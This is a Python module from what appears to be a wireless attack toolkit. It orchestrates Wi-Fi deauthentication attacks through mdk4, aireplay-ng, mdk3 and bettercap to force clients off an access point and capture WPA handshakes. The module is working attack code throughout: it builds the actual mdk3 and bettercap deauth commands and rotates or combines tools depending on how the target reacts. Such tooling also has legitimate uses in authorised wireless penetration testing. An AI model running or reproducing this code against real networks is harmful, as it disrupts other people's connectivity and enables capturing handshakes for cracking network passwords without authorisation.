"""Multi-backend deauth dispatch for handshake capture."""

from __future__ import annotations

import os
import tempfile
import time
from dataclasses import dataclass
from enum import Enum
from typing import Callable

from ..config import WifluxConfig
from ..process import ManagedProcess, which
from .adaptive_deauth import DeauthOutcome
from .aireplay import HANDSHAKE_DEAUTH_PACKETS, Aireplay

DEFAULT_HANDSHAKE_TOOLS = ("mdk4", "aireplay", "bettercap", "mdk3")


class DeauthTool(str, Enum):
    MDK4 = "mdk4"
    AIREPLAY = "aireplay"
    BETTERCAP = "bettercap"
    MDK3 = "mdk3"


_TOOL_ALIASES = {
    "mdk4": DeauthTool.MDK4,
    "mdk3": DeauthTool.MDK3,
    "aireplay": DeauthTool.AIREPLAY,
    "aireplay-ng": DeauthTool.AIREPLAY,
    "bettercap": DeauthTool.BETTERCAP,
}


def parse_deauth_tools(spec: str | list[str] | None) -> list[DeauthTool]:
    """Parse tool names from CLI/config into ordered unique DeauthTool values."""
    if spec is None or spec == "" or spec == "auto":
        raw = list(DEFAULT_HANDSHAKE_TOOLS)
    elif isinstance(spec, str):
        raw = [part.strip().lower() for part in spec.split(",") if part.strip()]
    else:
        raw = [str(part).strip().lower() for part in spec if str(part).strip()]

    out: list[DeauthTool] = []
    seen: set[DeauthTool] = set()
    for name in raw:
        tool = _TOOL_ALIASES.get(name)
        if tool is None:
            raise ValueError(f"Unknown deauth tool: {name}")
        if tool not in seen:
            seen.add(tool)
            out.append(tool)
    return out or [DeauthTool.MDK4, DeauthTool.AIREPLAY]


def tool_available(tool: DeauthTool) -> bool:
    checks = {
        DeauthTool.MDK4: lambda: which("mdk4"),
        DeauthTool.MDK3: lambda: which("mdk3"),
        DeauthTool.AIREPLAY: lambda: which("aireplay-ng"),
        DeauthTool.BETTERCAP: lambda: which("bettercap"),
    }
    return bool(checks[tool]())


def available_tools(tools: list[DeauthTool]) -> list[DeauthTool]:
    return [tool for tool in tools if tool_available(tool)]


@dataclass(frozen=True)
class DeauthRoundRequest:
    bssid: str
    clients: list[str]
    essid: str | None = None
    focus: str | None = None
    packet_count: int = HANDSHAKE_DEAUTH_PACKETS


def _client_target(req: DeauthRoundRequest) -> str | None:
    return req.focus or (req.clients[0] if req.clients else None)


def _mdk4_round(cfg: WifluxConfig, req: DeauthRoundRequest) -> None:
    burst = max(1, req.packet_count)
    Aireplay.mdk4_deauth(cfg, req.bssid, None, count=burst)
    target = _client_target(req)
    if target:
        Aireplay.mdk4_deauth(cfg, req.bssid, target, count=burst)


def _aireplay_round(cfg: WifluxConfig, req: DeauthRoundRequest) -> None:
    burst = max(1, req.packet_count)
    Aireplay.deauth_target(cfg, req.bssid, None, essid=req.essid, count=burst)
    target = _client_target(req)
    if target:
        Aireplay.deauth_target(cfg, req.bssid, target, essid=req.essid, count=burst)
    elif req.clients:
        Aireplay.deauth_target(cfg, req.bssid, req.clients[0], essid=req.essid, count=burst)


def _mdk3_round(cfg: WifluxConfig, req: DeauthRoundRequest) -> None:
    if cfg.attack.no_deauth or not which("mdk3"):
        return
    iface = cfg.scan.interface
    if not iface:
        return
    bssid = req.bssid.upper()
    pps = max(10, min(80, req.packet_count * 12))
    with tempfile.NamedTemporaryFile("w", suffix=".mac", delete=False) as handle:
        handle.write(f"{bssid}\n")
        blacklist = handle.name
    try:
        cmd = ["mdk3", iface, "d", "-b", blacklist, "-s", str(pps)]
        proc = ManagedProcess(cmd, devnull=True)
        time.sleep(min(1.2, max(0.4, req.packet_count * 0.08)))
        proc.kill()
    finally:
        try:
            os.remove(blacklist)
        except OSError:
            pass


def _bettercap_round(cfg: WifluxConfig, req: DeauthRoundRequest) -> None:
    if cfg.attack.no_deauth or not which("bettercap"):
        return
    iface = cfg.scan.interface
    if not iface:
        return
    bssid = req.bssid.upper()
    target = _client_target(req)
    commands = [
        f"set wifi.interface {iface}",
        "wifi.recon on",
        "sleep 1",
        f"wifi.deauth {bssid}",
    ]
    if target:
        commands.append(f"wifi.deauth {bssid} {target.upper()}")
    commands.extend(["sleep 1", "quit"])
    script = "; ".join(commands)
    proc = ManagedProcess(
        ["bettercap", "-iface", iface, "-no-colors", "-silent", "-eval", script],
        devnull=True,
    )
    time.sleep(min(3.0, max(1.5, req.packet_count * 0.25)))
    proc.kill()


_BACKENDS: dict[DeauthTool, Callable[[WifluxConfig, DeauthRoundRequest], None]] = {
    DeauthTool.MDK4: _mdk4_round,
    DeauthTool.AIREPLAY: _aireplay_round,
    DeauthTool.MDK3: _mdk3_round,
    DeauthTool.BETTERCAP: _bettercap_round,
}


def run_backend(cfg: WifluxConfig, tool: DeauthTool, req: DeauthRoundRequest) -> None:
    if cfg.attack.no_deauth:
        return
    backend = _BACKENDS.get(tool)
    if backend is None:
        return
    backend(cfg, req)


class HandshakeDeauthDispatcher:
    """Rotate or combine multiple deauth backends during handshake capture."""

    def __init__(
        self,
        cfg: WifluxConfig,
        *,
        tools: list[DeauthTool] | None = None,
        rotate: bool = True,
        combo: bool = False,
    ):
        requested = tools or parse_deauth_tools(cfg.attack.deauth_tools)
        self.available = available_tools(requested)
        if not self.available:
            self.available = [t for t in (DeauthTool.MDK4, DeauthTool.AIREPLAY) if tool_available(t)]
        self.rotate = rotate and not combo
        self.combo = combo
        self._index = 0
        self._sticky: DeauthTool | None = None
        self.last_tools: list[DeauthTool] = []
        self.last_label = "none"

    @property
    def enabled(self) -> bool:
        return bool(self.available)

    def _select_tools(
        self,
        outcome: DeauthOutcome | None = None,
        *,
        advance: bool = True,
    ) -> list[DeauthTool]:
        if not self.available:
            return []
        if self.combo:
            return list(self.available)
        if outcome == DeauthOutcome.RESPONSIVE and self._sticky in self.available:
            return [self._sticky]
        if outcome in (DeauthOutcome.SILENT, DeauthOutcome.DEAUTH_SEEN) or self.rotate:
            tool = self.available[self._index % len(self.available)]
            if advance:
                self._index += 1
            return [tool]
        return [self.available[0]]

    def peek_next_tools(self, outcome: DeauthOutcome | None = None) -> list[DeauthTool]:
        """Preview backends for the next round without advancing rotation."""
        return self._select_tools(outcome, advance=False)

    def run_round(
        self,
        cfg: WifluxConfig,
        req: DeauthRoundRequest,
        *,
        outcome: DeauthOutcome | None = None,
    ) -> str:
        tools = self._select_tools(outcome, advance=True)
        if not tools:
            return "none"
        self.last_tools = tools
        for tool in tools:
            run_backend(cfg, tool, req)
            if len(tools) > 1:
                time.sleep(0.35)
        if outcome == DeauthOutcome.RESPONSIVE:
            self._sticky = tools[0]
        elif outcome in (DeauthOutcome.SILENT, DeauthOutcome.DEAUTH_SEEN):
            self._sticky = None
        self.last_label = "+".join(tool.value for tool in tools)
        return self.last_label